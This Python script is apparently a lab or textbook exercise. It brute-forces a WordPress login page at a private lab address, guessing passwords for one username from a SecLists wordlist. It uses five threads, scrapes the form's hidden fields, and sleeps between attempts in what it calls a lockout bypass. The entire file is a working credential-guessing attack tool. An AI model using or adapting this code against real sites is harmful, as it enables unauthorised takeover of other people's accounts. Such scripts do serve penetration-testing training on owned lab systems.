from io import BytesIO
from lxml import etree
from queue import Empty, Queue

import requests
import sys
import threading
import time

# string to check verifying successful login
SUCCESS = 'Welcome to WordPress!'
# HTML element attributes to be extracted from target
TARGET = 'http://192.168.127.128/wordpress/wp-login.php'
WORDLIST = '/usr/share/seclists/Passwords/Software/cain-and-abel.txt'
# WORDLIST = 'test.txt'

# build a queue from target wordlist
def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

# parse HTTP response content to extract form parameters
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    # find all input elements in the HTML and create dictionary of form parameters
    for elem in tree.findall('.//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        self.stop_event = threading.Event()
        self.threads = []
        self._print_lock = threading.Lock()
        self._connection_logged = False
        print(f'\nBrute forcing {url}.\n')
        print("Finished setup.\nTarget: %s\nUsername : %s\nWordlist: %s\n" % (TARGET, username, WORDLIST))
        try:
            if input("Continue? [y/N] ").lower() not in ('y', 'yes'):
                print("Exiting.")
                sys.exit(0)
        except KeyboardInterrupt:
            print("\nExiting.")
            sys.exit(0)

    def run_bruteforce(self, passwords):
        for _ in range(5):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.daemon = True
            self.threads.append(t)
            t.start()
        try:
            for t in self.threads:
                t.join()
        except KeyboardInterrupt:
            print('\n[!] Stopping threads...')
            # self.stop_event.set()
            return
        if not self._connection_logged:
            print(f"\n[!] Could not reach {self.url}. Ensure the target is up and try again.")
    
    def web_bruter(self, passwords):
        # initialze session object to maintain cookies across requests
        session = requests.Session()
        try:
            resp0 = session.get(self.url)
        except requests.RequestException as e:
            return
        with self._print_lock:
            if not self._connection_logged:
                print(f"[+] Connection established to {self.url}")
                self._connection_logged = True

            
        params = get_params(resp0.content)
        params['log'] = self.username

        while not self.stop_event.is_set():
            # attempt lockout bypass by sleeping; wait() returns immediately if stop_event is set
            self.stop_event.wait(5)
            if self.stop_event.is_set():
                return
            try:
                passwd = passwords.get_nowait()
            except Empty:
                return

            print(f'[>] Trying username/password: {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            # make POST request to login page with form parameters, checking for success string in response content
            try:
                resp1 = session.post(self.url, data=params)
            except requests.RequestException as e:
                print(f"[!] Error connecting to the application: {e}\n[-] Retrying payload {self.username}/{passwd} at the end.")
                passwords.put(passwd)
                continue
            if SUCCESS in resp1.content.decode():
                self.found = True
                self.stop_event.set()
                print(f"\n[*] Bruteforcing successful.")
                print("[+] Username is %s" % self.username)
                print("[+] Password is %s" % passwd)
                print('[-] Done: cleaning up threads...')
                sys.exit(0)

if __name__ == '__main__':
    words = get_words()
    b = Bruter('eric', TARGET)
    b.run_bruteforce(words)
    if not b.found:
        print('\nExhausted wordlist or encountered an exception; password not found.')